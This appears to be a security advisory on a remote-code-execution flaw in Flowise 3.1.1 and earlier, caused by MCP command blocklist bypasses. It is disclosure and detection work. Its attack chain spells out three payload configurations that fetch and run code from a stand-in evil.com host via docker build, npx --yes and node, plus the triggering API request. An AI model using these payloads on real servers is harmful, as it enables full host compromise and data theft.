---
title: Flowise MCP Security Bypass Leads to Remote Code Execution
slug: 2026-05-flowise-mcp-rce
description: Flowise versions 3.1.1 and earlier are vulnerable to remote code execution (RCE) due to multiple MCP security bypasses, allowing attackers to execute arbitrary commands on the Flowise server by exploiting blocklist weaknesses in docker build, npx, and node command handling.
date: "2026-05-14T15:00:25Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - execution
  - remote code execution
  - flowise
vendors:
  - npm
products:
  - flowise (<= 3.1.1)
  - flowise-components (<= 3.1.1)
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
references:
  - https://github.com/advisories/GHSA-m99r-2hxc-cp3q
rules:
  - title: Docker Build RCE Attempt
    description: Detects attempts to exploit the Docker build RCE vulnerability in Flowise by monitoring for docker build commands with remote URLs.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
  - title: NPX Yes RCE Attempt
    description: Detects attempts to exploit the npx --yes RCE vulnerability in Flowise by monitoring for npx commands with the --yes argument.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
  - title: Node File Access Bypass Attempt
    description: Detects attempts to exploit the local file access bypass in Flowise by monitoring for node commands attempting to load files starting with '//'.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - process_creation
      - linux
rules_count: 3
---

Flowise versions 3.1.1 and earlier contain multiple security vulnerabilities within the MCP (Model Chain Pipeline) feature that can be exploited to achieve remote code execution (RCE). These vulnerabilities stem from insufficient input validation and inadequate blocklists for commands executed by the system. An attacker with a Flowise account, or API access with view/update permissions for chatflows, can configure the MCP tool to bypass security restrictions. The three identified bypass methods involve exploiting weaknesses in the docker build command, the npx command, and the node command. Successful exploitation allows an attacker to execute arbitrary commands on the Flowise host machine.

## Attack Chain

1.  Attacker gains access to a Flowise account with any role or API access with view/update permissions for chatflows.
2.  Attacker configures the Custom MCP Server using one of the three following methods:
    *   **Docker Build Bypass:** Provides `{"command":"docker","args":["build","https://evil.com/"]}` as the Custom MCP Server configuration, bypassing the `validateCommandFlags` blocklist.
    *   **NPX --yes Bypass:** Provides `{"command":"npx","args":["--yes","malicious-package"]}` to bypass the `validateCommandFlags` blocklist.
    *   **Node Command Bypass:** Provides `{"command":"node","args":["//evil.com/malicious.js"]}` to bypass the `validateArgsForLocalFileAccess` security restrictions by using a double slash at the start of the path.
3.  For the Docker Build bypass, `docker build <remote-URL>` pulls a Dockerfile from a remote address specified by the attacker and executes the `RUN` instructions within it, enabling container escape and host control.
4.  For the NPX --yes bypass, `npx --yes malicious-package` automatically agrees to install and execute a malicious npm package, leading to RCE on the server.  The attacker hosts a malicious package with a postinstall script.
5.  For the Node Command bypass, the node process loads and executes arbitrary code from a local file whose path begins with `//`, bypassing the `validateArgsForLocalFileAccess` restrictions.  The attacker uploads a malicious javascript file.
6.  Attacker triggers the execution of the configured MCP via a `POST` request to `/api/v1/prediction/{chatflows_id}` with the body `{"question": "1"}`.
7.  The configured command (docker, npx, or node) is executed with the attacker-supplied arguments on the Flowise server.
8.  The attacker achieves remote code execution (RCE) on the Flowise server, potentially leading to full control of the host machine.

## Impact

Successful exploitation of these vulnerabilities allows attackers to execute arbitrary commands on the Flowise server. This can lead to complete system compromise, data theft, and disruption of services. This vulnerability affects Flowise installations using vulnerable versions of the `flowise` and `flowise-components` packages, potentially impacting any organization using Flowise for managing model chains.

## Recommendation

*   Upgrade to a patched version of Flowise that addresses the MCP security bypasses.
*   Deploy the provided Sigma rules to detect potential exploitation attempts of these vulnerabilities.
*   Review and harden the `validateCommandFlags` and `validateArgsForLocalFileAccess` functions within Flowise to prevent future bypasses. Refer to the vulnerable code snippets in the Overview section.
*   Monitor network traffic for suspicious `docker build` commands originating from Flowise servers, especially those pulling Dockerfiles from untrusted sources. The "Docker Build RCE Attempt" Sigma rule can help with this.
*   Block the execution of npx with the `--yes` argument. The "NPX Yes RCE Attempt" Sigma rule can help detect this behavior.
